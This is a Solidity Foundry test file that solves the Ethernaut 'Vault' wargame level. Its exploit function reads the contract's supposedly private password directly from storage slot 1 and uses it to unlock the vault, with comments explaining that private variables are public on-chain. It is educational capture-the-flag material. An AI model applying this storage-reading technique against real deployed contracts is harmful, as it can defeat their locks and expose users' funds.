// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Vault.sol";
import "src/levels/VaultFactory.sol";

contract TestVault is BaseTest {
    Vault private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new VaultFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Vault(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.locked(), true);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        // Do you think that because a variable is declared as `private` it means that is really private?
        // Everything is public on the blockchain!
        // For example you could go to Etherscan, find the "Create contract" transaction and see the calldata passed to create the contract
        // That calldata is the same `bytes32 _password` used as password!
        // You could fork the blockchain and inspect the storage slot of the contract via etherjs getStorageAt (https://docs.ethers.io/v5/api/providers/provider/#Provider-getStorageAt)
        // In this case we are using Foundry so here's the implementation with the tool we're using

        // In this case we are going to read from the second slot (index 1) because bytes32 take a whole word (256bits) so
        // Position 0 -> `locked`
        // Position 1 -> `password`

        bytes32 password = vm.load(address(level), bytes32(uint256(1)));
        level.unlock(password);

        assertEq(level.locked(), false);

        vm.stopPrank();
    }
}
